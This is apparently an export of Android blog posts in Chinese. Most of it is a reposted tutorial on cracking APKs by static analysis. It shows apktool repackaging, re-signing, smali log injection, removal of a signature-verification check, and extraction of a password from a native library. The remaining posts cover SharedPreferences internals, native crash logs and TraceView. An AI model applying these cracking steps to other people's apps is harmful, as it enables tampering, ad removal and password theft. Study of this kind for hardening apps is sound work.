总结从这篇文章我们可以可以看到，一个属性的不留意，会带来多大的风险，当然这个属性也是很蛋疼的，就是他默认值是true，所以在你不管他的情况下还是有问题的，必须手动的去设置成false才可以，所以这个也是导致现在市场上很多app都存在这样的风险。其次这里我们主要分析了一个智能应用锁的信息，发现他犯了一个最大的错误就是把密码用明文的方式保存在xml中，破解难度为0，如果有一些你的朋友或者你的老婆，想看你的微信和QQ，同时又发现了你用了这个app去加密，那么你就惨了，你老婆只要会adb命令，或者看到这篇文章之后，就两步，然后看到你不想让她看到的数据，好吧，然后就没然后了，所以我们开发者在开发一个app的时候，不仅要的是用户体验，更重要的时候对用户的隐私负责。我们用户在下载和安装一些app的时候也是需要注意的就是多留点心","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"}]},{"title":"Android逆向之旅---静态分析技术来破解Apk","slug":"Android逆向之旅-静态分析技术来破解Apk","date":"2017-10-20T03:12:39.000Z","updated":"2020-05-11T07:23:44.641Z","comments":true,"path":"2017/10/20/Android逆向之旅-静态分析技术来破解Apk/","link":"","permalink":"https://superxlcr.github.io/2017/10/20/Android逆向之旅-静态分析技术来破解Apk/","excerpt":"","text":"本文转载自：http://blog.csdn.net/jiangwei0910410003/article/details/50083649 前言从这篇文章开始我们开始我们的破解之路，之前的几篇文章中我们是如何讲解怎么加固我们的Apk，防止被别人破解，那么现在我们要开始破解我们的Apk,针对于之前的加密方式采用相对应的破解技术，Android中的破解其实大体上可以分为静态分析和动态分析，对于这两种方式又可以细分为Java层(smail和dex)和native层(so)。所以我们今天主要来讲解如何通过静态分析来破解我们的apk，这篇文章我们会通过破解Java层和native层的例子来讲解。 准备工作在开始今天的文章之前，我们需要准备点东西， 首先是基本知识 了解Android中的Apk文件的结构。 了解Smail语法和dex文件格式 apk的签名机制 关于这三个知识点，这里就不做详细介绍了，不理解的同学可以自行网上学习，有很多资料讲解的。 再者就是几个重要的工具 apktool：反编译的利器 dex2jar：将dex转化成jar jd-gui：很好的查看jar文件的工具 IDA：收费的最全破解利器(分析dex和so都可以) 下载地址：http://pan.baidu.com/s/1hqBC7Es额外：上面四个工具是最基本的，但是现在网上也有一些更好的工具：JEB,GDA等。但是这些工具就是丰富了上面四个工具，所以说我们只要上面的四个工具就足够了。IDA工具我专门给了一个下载地址，其他的工具在我们提供的案例中。 技术原理准备工作完了，下面就来看一下今天的破解方式介绍：Android中的破解的静态分析说重要，也不重要，为什么这么说呢？因为我们到后面会介绍动态分析，那时候我们在破解一个Apk的时候，发现静态分析的方式几乎毫无用途，因为现在的程序加固的越来越高级，静态分析几乎失效，所以动态分析是必须的，但是要是说静态分析没有用，那么也错了，因为我们在有些场景下，只有静态分析能够开始破解之门，没有静态分析之后的结果，动态分析是无法开展的。这个下面会举例说明。所以说在破解的过程中，静态分析和动态分析一定会结合在一起的，只有这样我们才会勇往直前。下面就来看看我们如何通过静态分析来破解apk. 静态分析的流程 使用apktool来反编译apk在这个过程中，我们会发现有些apk很轻易的被反编译了，但是有些apk每次反编译都会报各种错误，这个也是正常的，因为加固了吗。现在网上有很多对apk加密的方式，直接让反编译就通不过，比如Androidmanifest文件，dex文件等，因为apktool他需要解析这些重要的资源，一旦这些文件加密了那么就会终止，所以这里我们暂且都认为apk都能反编译的，因为我们今天是主要介绍怎么通过静态分析来破解，关于这里的反编译失败的问题，我后面会在用一篇文章详细介绍，到时候会列举一些反编译错误的例子。 得到程序的smail源码和AndroidManifest.xml文件我们知道一个Android的程序入口信息都会在AndroidManifest.xml中，比如Application和入口Activity,所以我们肯定会先来分析这个文件，找到我们想要的信息，当然这里还有一个常用的命令需要记住： adb shell dumpsys activity top能够获取到当前程序的Activity信息然后我们会分析smail代码，进行代码逻辑的修改3. 直接解压apk文件得到classes.dex文件，然后用dex2jar工具得到jar,用jd-gui工具查看这里我们主要很容易的查看代码，因为我们在第二步中得到了smail源码，就可以分析程序了，但是我们知道虽然smail语法不是很复杂，至少比汇编简单，但是怎么看着都是不方便的，还是看java代码比较方便，所以我们借助jd-gui工具查看代码逻辑，然后在smail代码中进行修改即可，上面说到的JEB工具，就加强了jd-gui工具的功能，它可以直接将smail源码翻译成java代码，这样我们就不需要先用jd-gui工具查看，再去smail源码中修改了，借助JEB即可。4. 如果程序中有涉及到native层的话，我们可以用IDA打开指定的so文件。我们还是需要先看java代码，找到指定的so文件，在用IDA来静态分析so文件。 用到的技术上面介绍了静态分析的流程，下面来看一下静态分析的几个技术，我们在静态分析破解Apk的时候，首先需要找到突破点，找到关键的类和方法，当然这里就需要经验了，不是有方法可循的。但是我们会借助一些技术来加快破解。 全局查找关键字符串和日志信息这个技术完全靠眼，我们在运行程序之后，会看到程序中出现的字符串，比如文本框，按钮上的文本，toast显示的信息等，都可能是重要信息，然后我们可以在jd-gui工具中全局搜索这个字符串，这样就会很快的定位到我们想要找的逻辑地方： 当然我们还有一个重要点就是Android中的Log信息，因为在一个大的项目中，会有多人开发，所以每个模块每个人开发，每个人都会调试信息，所以就会添加一些log信息，但是不是所有的人都会记得在项目发布的时候关闭项目中的所有log信息，这个也是我们在项目开发的过程中不好的习惯。这时候我们就可以通过程序运行起来之后，会打印一些log信息，那么我们可以通过这些信息获取突破点，Android中的log可以根据一个应用来进行过滤的，或者我们可以通过log信息中的字符串在jd-gui中进行全局搜索也是可以的。 代码的注入技术在第一种方式中我们通过全局搜索一些关键的字符串来找突破点，但是这招有时候不好使，所以这时候我们需要加一些代码了来观察信息了，这里有一个通用的方法就是加入我们自己的log代码，来追踪代码的执行逻辑，因为这里讲的是静态分析技术，所以就用代码注入技术来跟踪执行逻辑，后面介绍了动态分析技术之后，那就简单了，我们可以随意的打断点来进行调试。这里的添加代码，就是修改smail代码，添加我们的日志信息即可，在下面我们会用例子来进行讲解，这个也是我们最常用的一种技术。 使用系统的Hook技术，注入破解程序进程，获取关键方法的执行逻辑关于Android中的进程注入和Hook技术，这里就不做详细介绍了，不了解这些技术的同学可以转战：注入技术：http://blog.csdn.net/jiangwei0910410003/article/details/39292117 Hook技术：http://blog.csdn.net/jiangwei0910410003/article/details/41941393这两篇文章介绍了这两项技术，但是我们在实际操作过程中不用这两篇文章中用到的方式，因为这两篇文章只是介绍原理，技术还不是很成熟，关于这两个技术，网上有两个框架很成熟，也很实用，就是人们熟知的：Cydia和Xposed,关于这两个框架的话，网上的资料太多了，而且用起来也很容易，这里就不做太多的详细介绍了。我们在实际的破解的过程中，这种方式用的有点少，因为这种方式效率有点低，所以只有在特定的场景下会使用。 使用IDA来静态分析so文件这里终于用到了IDA工具了，本人是感觉这个工具太强大了，他可以查看so中的代码逻辑，我们看到的的可能是汇编指令，所以这里就有一个问题了，破解so的时候，我们还必须掌握一项技能，就是能看懂汇编指令，不然用IDA来破解程序，会很费经的，关于汇编指令，大学的时候，我们接触过了，但是我们当时感觉这东西又难，而且用的地方也很少，所以就没太在意，其实不然呀，真正懂汇编的人才是好的程序员： 看到些汇编指令，头立马就大了，不过这个用多了，破解多了，还是可以的。我们可以看到左边栏中有我们的函数，我们可以找到指定函数的定义的地方进行查看即可。其实IDA最强大的地方是在于他动态调试so文件，下一篇文章会介绍怎么动态调试so文件。当然IDA可也是可以直接查看apk文件的： 可以查看apk文件中的所有文件，我们可以选择classes.dex文件： 但是这里我们可能会遇到一个问题，就是如果应用程序太大的话，这个打开的过程中会很慢的，有可能IDA停止工作，所以要慢慢等啦： 打开之后，我们可以看到我们的类和方法名，这里还可以支持搜索类名和方法名Ctrl+F，也可以查看字符串内容(Shirt+F12): 我们发现IDA也是一个分析Java代码的好手，所以说这个工具太强大了啦啦~~ 案例分析上面讲解了静态分析的破解技术，那么下面就开始使用一个例子来看看静态分析的技术。 静态分析Java(smail)代码首先我们拿到我们需要破解的Apk,使用apktool.jar工具来反编译：java -jar apktool.jar d xxx.apk 这个apk很是容易就被反编译了，看来并没有进行任何的加固。那就好办了，我们这里来改一下他的AndroidManifest.xml中的信息，改成可调式模式，这个是我们后面进行动态调试的前提，一个正式的apk，在AndroidManifest.xml中这个值是false的。我们看看他的AndroidManifest.xml文件： 我们把这个值改成true.在回编译，这时候我们就可以动态调试这个apk了，所以在这点上我们可以看到，静态分析是动态分析的前提，这个值不修改的话，我们是办法进行后续的动态调试的。修改成功之后，我们进行回编译： 1234567891011121314151617cd C:\\Users\\jiangwei\\Desktop\\静态分析\\apktool_2.0.0rc4del debug.sig.apkjava -jar apktool.jar b -d 123 -o debug.apkjava -jar .\\sign\\signapk.jar .\\sign\\testkey.x509.pem .\\sign\\testkey.pk8 debug.apk debug.sig.apkdel debug.apkadb uninstall com.shuqi.controlleradb install debug.sig.apkadb shell am start -n com.shuqi.controller/.Loadingpause 这里是为了简单，写了一个批处理，首先进入到目录，然后使用命令进行回编译：java -jar apktool.jar b -d sq -o debug.apk sq是之前反编译的目录，debug.apk是回编译之后的文件这时候，debug.apk是不能安装运行的，因为没有签名，Android中是不允许安装一个没有签名的apk下面还要继续签名，我们用系统自带的签名文件即可签名：java -jar .\\sign\\signapk.jar .\\sign\\testkey.x509.pem .\\sign\\testkey.pk8 debug.apk debug.sig.apk 注：其实我们在用IDE工具开发android项目的时候，工具就是用这个签名文件进行签名的，只是这个过程IDE帮我们做了。后面就是直接安装这个apk,然后运行这个Apk。这个过程中我们只需要知道应用的包名和入口Activity名称即可，这个信息我们在AndroidManifest.xml中也是可以获取到的，当然我们用：adb shell dumpsys activity top 命令也可以得到： 回编译之后，我们运行程序，发现有问题，就是点击程序的icon，没反应，运行不起来，我们在查看log中的异常信息，发现也没有抛出任何异常，那么这时候，我们就判断，他内部肯定做了什么校验工作，这个一般回编译之后的程序运行不起来的话，那就是内部做校验了，一般做校验的话，有两种： 对dex做校验，防止修改dex的 对apk的签名做校验，防止重新打包 那我们就需要从新看看他的代码，来看看是不是做了校验：我们在分析代码的时候，肯定先看看他有没有自己定义Application,如果有定义的话，就需要看他自己的Application类，这里我们看到他定了自己的Application：com.shuqi.application.ShuqiApplication我们解压apk,得到dex,然后dex2jar进行转化，得到jar，再用jd-gui查看这个类： 这里我们看到他的代码做混淆了，但是一些系统回调方法肯定不能混淆的，比如onCreate方法，但是这里我们一般找的方法是： 首先看这个类有没有静态方法和静态代码块，因为这类的代码会在对象初始化之前运行，可能在这里加载so文件，或者是加密校验等操作 再看看这个类的构造方法 最后再看生命周期方法 我们这里看到他的核心代码在onCreate中，调用了很多类的方法，猜想这里的某个方法做工作了？这时候我们就来注入我们的代码来跟踪是哪个方法出现问题了，这里有的同学有疑问，其实就这几个方法，直接一个一个看不就结了，哎，我们这篇文章就是要介绍静态分析技术，当然就需要做案例啦。下面来看看我们怎么添加我们的日志信息，其实很简单，就是添加日志，需要修改smail文件，我们在去查看smail源码： 关于smail语法，本人认为不是很难，所以大家自己网上去搜一些资料学习一下即可，这里我们可以很清晰的看到调用了这些方法，那么我们就在每个方法加上我们的日志信息，这里加日志有两种方式，一种就是直接在这里调用系统的log方法，但是有两个问题： 需要导入包，在smail中修改 需要定义一个两个参数，一个是tag,msg,才能正常的打印log出来 明显这个方法有点麻烦，这里我们就自己定义一个MyLog类，然后反编译，得到MyLog的smail文件，添加到这个ShuqiApplication.smail的root目录下，然后在代码中直接调用即可，至于为何要放到root目录下，这样在代码中调用就不需要导入包了，比如SuqiApplication.smail中的一些静态方法调用： 编写日志类MyLog，这里就不粘贴代码了，我们新建一个项目之后，反编译得到MyLog.smail文件，放到目录中： 我们得到这个文件的时候，一定要注意，把MyLog.smail的包名信息删除，因为我们放到root目录下的，意味着这个MyLog类是没有任何包名的，这个需要注意，不然最后加的话，也是报错的。我们在ShuqiApplication的onCreate方法中插入我们的日志方法：invoke-static {}, LMyLog;-&gt;print()V 但是我们在加代码的时候，需要注意的是，要找对地方加，所谓找对地方，就是在上个方法调用完之后添加，比如：invoke-virtual,invoke-static等，而且这些指令后面不能有：move-result-object，因为这个指令是获取方法的返回值，所以我们一般是这么加代码的： 在invoke-static/invoke-virtual指令他的返回类型是V之后可以加入 在invoke-static/invoke-virtual指令返回类型不是V,之后的move-result-object命令之后可以加入 加好了我们的日志代码之后，下面我们就回编译执行，在这个过程可能会遇到samil语法错误，这个就对应指定的文件修改就可以了，我们得到回编译的apk之后，可以在反编译一下，看看他的java代码： 我们看到了，我们添加的代码，在每个方法之后打印信息。下面我们运行程序，同时开启我们的log的tag：adb logcat -s JW 看到我们打印的日志了，我们发现打印了三个log,这里需要注意的是，这里虽然打印了三个log,但是都是在不同的进程中，所以说一个进程中的log的话，只打印了一个，所以我们判断，问题出现在vr.h这个方法我们查看这个方法源码： 果然，这个方法做了签名验证，不正确的话，直接退出程序。那么我们现在要想正常的运行程序的话，很简单了，直接注释这行代码：vr.h(this)然后回编译，在运行，果然不报错了，这里就不在演示了： 好了，上面就通过注入代码，来跟踪问题，这个方法是很常用，也是很实在的。 静态分析Native代码下面继续来介绍一下，如何使用IDA来静态分析native代码，这里一定要熟悉汇编指令，不然看起来很费劲的。我们在反编译之后，看到他的onCreate方法中有一个加载so的代码看看这个代码： 获取密码的方法，是native的，我们就来看看那个getDbPassword方法，用IDA打开libpsProcess.so文件： 我们看看这个函数的实现，我们一般直接看BL/BLX等信息，跳转逻辑，还有就是返回值，我们在函数的最后部分，发现一个重点，就是：BL __android_log_print 这个是在native层调用log的函数，我们在往上看，发现：tag是System.out.c我们运行程序看起log看看，但是我们此时也可以在java层添加日志的：我们全局搜索这个方法，在yi这个类中调用的 我们修改yi.smail代码： 回编译，在运行程序，开启log： 12adb logcat -s JWadb logcat -s System.out.c 发现，返回的密码java层和native层是一样的。说明我们静态分析native还是有效的。 好了，到这里我们今天的内容就介绍完了，当然还有很多静态分析apk的方法，这里只是介绍了本人用到的技术。 案例下载：http://download.csdn.net/detail/jiangwei0910410003/9308217案例中有个说明文件，运行前请阅读~~ 未解决的问题 如何搞定apktool工具反编译出错的问题这个我在开始的时候也说了，这里出错的原因大部分是apk进行加固了，所以后面我会专门介绍一下如何解决这样的问题 如何搞定让一个Apk可以调试我们在上面看到一个apk想要能调试的话，需要修改android:debug的值，但是有时候，我们会遇到修改失败，导致程序不能运行，后面会专门介绍有几种方式来让一个发布后的apk可以调试 技术总结这篇文章我们介绍了如何使用静态方式去破解一个apk,我们在破解一个apk的时候，其实就是改点代码，然后能够运行起来，达到我们想要的功能，一般就是： 注释特定功能，比如广告展示等 得到方法的返回值，比如获取用户的密码 添加我们的代码，比如加入我们自己的监测代码和广告等 我们在静态分析代码的时候，需要遵循的大体路线： 首先能够反编译，得到AndroidManifest.xml文件，找到程序入口代码 找到我们想要的代码逻辑，一般会结合界面分析，比如我们想得让用户登录成功，我们肯定想要得到用户登录界面Activity,这时候我们可以用adb shell dumpsys activity top命令得到Activity名称，然后用Eclipse自带的程序当前视图分析工具：得到控件名称，或者是在代码中获取layout布局文件，一般是setContentView方法的调用地方，然后用布局文件结合代码得到用户登录的逻辑，进行修改 在关键的地方通过代码注入技术来跟踪代码执行逻辑 注意方法的返回值，条件判断等比较显眼的代码 对于有些apk中的源码，可能他有自己的加密算法，这时候我们需要获取到这个加密方法，如果加密方法比较复杂的话，我们就需要大批的测试数据来获取这个加密方法的逻辑，一般是输入和输出作为一个测试用例，比如阿里安全第一届比赛的第一题就可以用静态分析的方式破解，它内部就是一个加密算法，我们需要用测试数据来破解。 对于那些System.loadLibrary加载so文件的代码，我们只需要找到这个so文件，然后用IDA打开进行静态分析，因为有些apk中把加密算法放到了so中了，这时候我们也可以通过测试数据来获取加密算法。 通过上面的例子，我们可以总结一个方式，就是现在很多apk会做一些校验工作，一般在代码中包含：“signature”字符串信息，所以我们可以全局搜索一下，也许可以获取一些重要信息。 总结这篇文章总算是讲解完了，其实早就想用写破解的文章了，因为破解比加固有意思，至少破解成功了有成就感。这篇文章主要介绍了如何通过静态分析方式破解，介绍了一些工具的时候，破解流程和破解技巧。最常用的就是代码注入技术和全局搜索关键字符串等方式，但是我们可以看到，现在市面上的很多apk，光通过静态分析是无法满足我们的破解需求了，所以动态分析方式就来了，而且动态方式破解难度会很大，需要掌握的东西也很多，我后面会分几篇文章来一一介绍动态破解的技巧和常见的问题。但是静态方式破解也是很重要的。当然也是动态分析的前提，所以我们既然玩破解，那么这两种技术都必须很好的掌握。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"编译","slug":"编译","permalink":"https://superxlcr.github.io/tags/编译/"}]},{"title":"SharePreferences源码分析","slug":"SharePreferences源码分析","date":"2017-10-15T09:13:49.000Z","updated":"2020-05-11T07:23:44.732Z","comments":true,"path":"2017/10/15/SharePreferences源码分析/","link":"","permalink":"https://superxlcr.github.io/2017/10/15/SharePreferences源码分析/","excerpt":"","text":"最近在项目中使用了SharePreferences，因此看了一下SharePreferences相关的源码，在此进行一下记录SharePreferences在Android提供的几种数据存储方式中属于轻量级的键值存储方式，以XML文件方式保存数据，通常用来存储一些用户行为开关状态等，一般的存储一些常见的数据类型。 SharePreferences保存的xml文件存放于 /data/data/应用程序包/shared_prefs 的目录下SharePreferences是接口，位于android.content包中SharePreferencesImpl是对于SharePreferences的实现，位于android.app包下以下是一段SharePreferences的写入以及读取的例子： 123456789101112@Overrideprotected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); SharedPreferences sp = getSharedPreferences(\"data\", MODE_PRIVATE); SharedPreferences.Editor editor = sp.edit(); editor.putString(\"name\", \"username\"); editor.commit(); String s = sp.getString(\"name\", \"\");&#125; 第6行调用了ContextWrapper中的getSharedPreferences方法： 1234@Overridepublic SharedPreferences getSharedPreferences(String name, int mode) &#123; return mBase.getSharedPreferences(name, mode);&#125; 这里调用了mBase的getSharedPreferences，mBase是ContextWrapper持有的Context变量，很明显实际类型即是ContextImpl（Context的实现类）： 12345678910111213141516171819202122@Overridepublic SharedPreferences getSharedPreferences(File file, int mode) &#123; checkMode(mode); SharedPreferencesImpl sp; synchronized (ContextImpl.class) &#123; final ArrayMap&lt;File, SharedPreferencesImpl&gt; cache = getSharedPreferencesCacheLocked(); sp = cache.get(file); if (sp == null) &#123; sp = new SharedPreferencesImpl(file, mode); cache.put(file, sp); return sp; &#125; &#125; if ((mode &amp; Context.MODE_MULTI_PROCESS) != 0 || getApplicationInfo().targetSdkVersion &lt; android.os.Build.VERSION_CODES.HONEYCOMB) &#123; // If somebody else (some other process) changed the prefs // file behind our back, we reload it. This has been the // historical (if undocumented) behavior. sp.startReloadIfChangedUnexpectedly(); &#125; return sp;&#125; 上面代码首先检查了是否缓存过对应的SharedPreferences，如果没有缓存则创建SharedPreferencesImpl对象（第9行）： 12345678SharedPreferencesImpl(File file, int mode) &#123; mFile = file; mBackupFile = makeBackupFile(file); mMode = mode; mLoaded = false; mMap = null; startLoadFromDisk();&#125; 简单说一下这里的几个变量： mFile：当前的xml文件，即/data/data/应用程序包/shared_prefs/xxx.xml mBackupFile：当前xml备份文件，名为xxx.xml.bak mMode：int类型，表示打开的模式 mLoaded：boolean类型，表示是否已经加载xml文件 mMap：xml的数据再内存中的储存形式 在SharedPreferencesImpl构造函数中，调用了startLoadFromDisk方法加载xml中的数据： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859private void startLoadFromDisk() &#123; synchronized (this) &#123; mLoaded = false; &#125; new Thread(\"SharedPreferencesImpl-load\") &#123; public void run() &#123; synchronized (SharedPreferencesImpl.this) &#123; loadFromDiskLocked(); &#125; &#125; &#125;.start();&#125; private void loadFromDiskLocked() &#123; if (mLoaded) &#123; return; &#125; if (mBackupFile.exists()) &#123; mFile.delete(); mBackupFile.renameTo(mFile); &#125; // Debugging if (mFile.exists() &amp;&amp; !mFile.canRead()) &#123; Log.w(TAG, \"Attempt to read preferences file \" + mFile + \" without permission\"); &#125; Map map = null; StructStat stat = null; try &#123; stat = Os.stat(mFile.getPath()); if (mFile.canRead()) &#123; BufferedInputStream str = null; try &#123; str = new BufferedInputStream( new FileInputStream(mFile), 16*1024); map = XmlUtils.readMapXml(str); &#125; catch (XmlPullParserException e) &#123; Log.w(TAG, \"getSharedPreferences\", e); &#125; catch (FileNotFoundException e) &#123; Log.w(TAG, \"getSharedPreferences\", e); &#125; catch (IOException e) &#123; Log.w(TAG, \"getSharedPreferences\", e); &#125; finally &#123; IoUtils.closeQuietly(str); &#125; &#125; &#125; catch (ErrnoException e) &#123; &#125; mLoaded = true; if (map != null) &#123; mMap = map; mStatTimestamp = stat.st_mtime; mStatSize = stat.st_size; &#125; else &#123; mMap = new HashMap&lt;String, Object&gt;(); &#125; notifyAll();&#125; 在startLoadFromDisk方法中，SharedPreferencesImpl开启了新的子线程，并持有对象锁来调用loadFromDiskLocked方法，通过XmlUtils工具类把xml读取为内存中的Map形式，最后通过notifyAll通知所有wait的地方 看完SharedPreferencesImpl的初始化，我们来看一下它的get方法，以例子中的getString为例： 12345678910111213141516171819202122public String getString(String key, String defValue) &#123; synchronized (this) &#123; awaitLoadedLocked(); String v = (String)mMap.get(key); return v != null ? v : defValue; &#125;&#125; private void awaitLoadedLocked() &#123; if (!mLoaded) &#123; // Raise an explicit StrictMode onReadFromDisk for this // thread, since the real read will be in a different // thread and otherwise ignored by StrictMode. BlockGuard.getThreadPolicy().onReadFromDisk(); &#125; while (!mLoaded) &#123; try &#123; wait(); &#125; catch (InterruptedException unused) &#123; &#125; &#125;&#125; 该方法在持有对象锁的情况下，通过awaitLoadedLocked方法检查是否已经从xml加载到内存map中，然后直接读取map中的数据即可 awaitLoadedLocked方法处理了一些与StrictMode相关的问题，在此不做讨论，在它发现SharedPreferencesImpl还没有加载完毕时，会调用wait方法把当前线程挂起，直到加载完毕通过notifyAll唤醒看完了SharedPreferencesImpl的get方法，我们再来看一下如何向其中插入新的数据： 1234567891011121314public Editor edit() &#123; // TODO: remove the need to call awaitLoadedLocked() when // requesting an editor. will require some work on the // Editor, but then we should be able to do: // // context.getSharedPreferences(..).edit().putString(..).apply() // // ... all without blocking. synchronized (this) &#123; awaitLoadedLocked(); &#125; return new EditorImpl();&#125; 当我们调用edit方法时，会返回一个新的Edit接口的实现类EditorImpl，EditorImpl使用的是默认构造函数，它包含了两个成员变量： mModified：Map类型，用于存储修改的键值对 mClear：boolean类型，用于标识是否清空SharedPreferences 获取EditorImpl实例后，我们会调用其put或者clear方法修改SharedPreferences： 12345678910111213public Editor putString(String key, String value) &#123; synchronized (this) &#123; mModified.put(key, value); return this; &#125;&#125; public Editor clear() &#123; synchronized (this) &#123; mClear = true; return this; &#125;&#125; put方法会把我们的修改存入mModified变量，而clear方法会把mClear变量置为true当我们修改SharedPreferences完成后，会调用Editor的apply或者commit方法（apply为异步提交，commit为同步提交）： 1234567891011121314151617181920212223242526272829303132333435363738394041public void apply() &#123; final MemoryCommitResult mcr = commitToMemory(); final Runnable awaitCommit = new Runnable() &#123; public void run() &#123; try &#123; mcr.writtenToDiskLatch.await(); &#125; catch (InterruptedException ignored) &#123; &#125; &#125; &#125;; QueuedWork.add(awaitCommit); Runnable postWriteRunnable = new Runnable() &#123; public void run() &#123; awaitCommit.run(); QueuedWork.remove(awaitCommit); &#125; &#125;; SharedPreferencesImpl.this.enqueueDiskWrite(mcr, postWriteRunnable); // Okay to notify the listeners before it's hit disk // because the listeners should always get the same // SharedPreferences instance back, which has the // changes reflected in memory. notifyListeners(mcr);&#125; public boolean commit() &#123; MemoryCommitResult mcr = commitToMemory(); SharedPreferencesImpl.this.enqueueDiskWrite( mcr, null /* sync write on this thread okay */); try &#123; mcr.writtenToDiskLatch.await(); &#125; catch (InterruptedException e) &#123; return false; &#125; notifyListeners(mcr); return mcr.writeToDiskResult;&#125; 两个方法都首先调用了commitToMemory方法，把修改同步到内存中，然后都把写入文件中的任务加入到了队列当中等待执行写入文件的任务使用的同步工具是CounDownLatch，commit在当前线程调用了await方法等待写入完成并返回Boolean表示写入状态，而apply在把写入任务加入队列后则返回了在看commitToMemory方法之前，我们先来看看他的返回结果：MemoryCommitResult类 1234567891011121314// Return value from EditorImpl#commitToMemory()private static class MemoryCommitResult &#123; public boolean changesMade; // any keys different? public List&lt;String&gt; keysModified; // may be null public Set&lt;OnSharedPreferenceChangeListener&gt; listeners; // may be null public Map&lt;?, ?&gt; mapToWriteToDisk; public final CountDownLatch writtenToDiskLatch = new CountDownLatch(1); public volatile boolean writeToDiskResult = false; public void setDiskWriteResult(boolean result) &#123; writeToDiskResult = result; writtenToDiskLatch.countDown(); &#125;&#125; MemoryCommitResult中：writeToDiskResult用于表示写入文件的结果，mapToWriteToDisk表示写入文件的map，即Editor更新后的mapcommitToMemory方法如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465// Returns true if any changes were madeprivate MemoryCommitResult commitToMemory() &#123; MemoryCommitResult mcr = new MemoryCommitResult(); synchronized (SharedPreferencesImpl.this) &#123; // We optimistically don't make a deep copy until // a memory commit comes in when we're already // writing to disk. if (mDiskWritesInFlight &gt; 0) &#123; // We can't modify our mMap as a currently // in-flight write owns it. Clone it before // modifying it. // noinspection unchecked mMap = new HashMap&lt;String, Object&gt;(mMap); &#125; mcr.mapToWriteToDisk = mMap; mDiskWritesInFlight++; boolean hasListeners = mListeners.size() &gt; 0; if (hasListeners) &#123; mcr.keysModified = new ArrayList&lt;String&gt;(); mcr.listeners = new HashSet&lt;OnSharedPreferenceChangeListener&gt;(mListeners.keySet()); &#125; synchronized (this) &#123; if (mClear) &#123; if (!mMap.isEmpty()) &#123; mcr.changesMade = true; mMap.clear(); &#125; mClear = false; &#125; for (Map.Entry&lt;String, Object&gt; e : mModified.entrySet()) &#123; String k = e.getKey(); Object v = e.getValue(); // \"this\" is the magic value for a removal mutation. In addition, // setting a value to \"null\" for a given key is specified to be // equivalent to calling remove on that key. if (v == this || v == null) &#123; if (!mMap.containsKey(k)) &#123; continue; &#125; mMap.remove(k); &#125; else &#123; if (mMap.containsKey(k)) &#123; Object existingValue = mMap.get(k); if (existingValue != null &amp;&amp; existingValue.equals(v)) &#123; continue; &#125; &#125; mMap.put(k, v); &#125; mcr.changesMade = true; if (hasListeners) &#123; mcr.keysModified.add(k); &#125; &#125; mModified.clear(); &#125; &#125; return mcr;&#125; 在第26行我们可以看到，Editor首先通过mClear变量决定是否清空mMap，然后通过mModified变量决定如何修改mMap","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"源码","slug":"源码","permalink":"https://superxlcr.github.io/tags/源码/"}]},{"title":"记一次Native层崩溃追踪","slug":"记一次Native层崩溃追踪","date":"2017-10-13T07:36:39.000Z","updated":"2020-05-11T07:23:44.906Z","comments":true,"path":"2017/10/13/记一次Native层崩溃追踪/","link":"","permalink":"https://superxlcr.github.io/2017/10/13/记一次Native层崩溃追踪/","excerpt":"","text":"前一阵子遇到了一次Native层的崩溃，在此记录一下debug的心得：不能只看Error级别的日志：因为崩溃原因在Native层，因此并不会打印Error级别的Java堆栈信息，这是我们可以通过搜索 Build fingerprint 关键字，来搜索Android在Native层打印出来的日志： 可以看到打印出来的Native日志是Info级别的，因此我们不能只关注Error级别的日志 Native日志包含了进程死亡时接收的信号量，寄存器的状态以及内存的一些状态，异常定位代码（C层面的），还有就是进程死前的pid以及tid 虽然大部分信息都看不懂……但是还是可以依据pid确定进程死亡的时间，再结合前后的日志以及操作确定具体问题的。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"cpp","slug":"cpp","permalink":"https://superxlcr.github.io/tags/cpp/"}]},{"title":"TraceView工具如何使用","slug":"TraceView工具如何使用","date":"2017-10-12T12:53:07.000Z","updated":"2020-05-11T07:23:44.741Z","comments":true,"path":"2017/10/12/TraceView工具如何使用/","link":"","permalink":"https://superxlcr.github.io/2017/10/12/TraceView工具如何使用/","excerpt":"","text":"TraceView工具如何使用TraceView有4种启动/关闭分析方式： 第一种使用方法演示选择跟踪范围在想要根据的代码片段之间使用以下两句代码： 12Debug.startMethodTracing(\"love_world_\");Debug.stopMethodTracing(); 例如，onCreate与onStart方法之间方法跟踪 123456789101112131415161718public class MainActivity extends Activity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Debug.startMethodTracing(\"Love_World_\"); &#125; @Override protected void onStart() &#123; super.onStart(); Debug.stopMethodTracing(); &#125; &#125; 添加SD卡访问权限12&lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/&gt; &lt;uses-permission android:name=\"android.permission.MOUNT_UNMOUNT_FILESYSTEMS\"/&gt; 如果不添加，执行项目会出现以下异常 1java.lang.RuntimeException:Unable to open trace file &apos;/mnt/sdcard/Love_World_.trace&apos;: Permission denied 如果手机没有SD卡也会出现同样的问题 导出traceview文件首先执行项目，查看trace文件是否生成进入shell模式 1adb shell 查看是否已经生成这个文件 1ls sdcard/Love_World_.trace 导出trace文件1adb pull sdcard/Love_World_.trace 打开trace文件打开trace文件需要Android提供的traceview.bat工具，工具所在目录：sdk\\tools\\traceview.bat， 有两种方式执行： 在命令行中切换到此目录 将此目录添加到系统环境变量中 12// cmd在calc.trace所在目录执行 traceview C:\\Users\\YourName\\Desktop\\Love_World_.trace 其中“C:\\Users\\YourName\\Desktop\\” 表示trace所在你系统中的目录，此工具需要输入trace文件的绝对路径才行 在新版本的SDK 会有以下提示： 12The standalone version of traceview is deprecated. Please use Android Device Monitor 